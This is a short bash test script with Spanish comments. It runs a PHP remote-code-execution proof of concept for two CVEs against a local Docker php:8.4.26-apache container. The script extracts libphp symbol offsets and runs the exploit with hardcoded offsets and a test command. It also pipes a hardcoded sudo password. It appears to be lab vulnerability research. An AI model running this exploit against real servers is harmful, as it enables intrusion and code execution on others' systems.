#!/usr/bin/env bash
# w2-docker.sh — intento W2 contra el target oficial php:8.4.26-apache en Docker.
set -uo pipefail

echo kali | sudo -S -v 2>/dev/null

echo "== Target oficial =="
sudo -n /usr/local/bin/docker exec w2target php -v | head -2
sudo -n /usr/local/bin/docker exec w2target php -i | grep -E '^memory_limit|^display_errors|^session.upload_progress.enabled' | head -3
echo "== Offsets reales del libphp del contenedor =="
nm /tmp/opencode/libphp-docker.so 2>/dev/null | grep -E ' (zif_system|zval_ptr_dtor)$'

echo
echo "== PoC contra el target oficial =="
cd /tmp/opencode/php2shell/php2shell-CVE-2026-109618-CVE-2026-109619-PoC-main
python3 poc_patched.py \
  -u http://127.0.0.1/session2.php \
  -c 'id>/tmp/p1' \
  --proof-file '' --fetch '' \
  --profile bookworm --offsets-file '' --no-auto-offsets \
  --zif-offset 0x465370 --dtor-offset 0x65eb60 \
  --huge-mb 12

echo
echo "== Impacto =="
sudo -n /usr/local/bin/docker exec w2target cat /tmp/p1 2>/dev/null || echo "sin /tmp/p1: no hubo RCE"
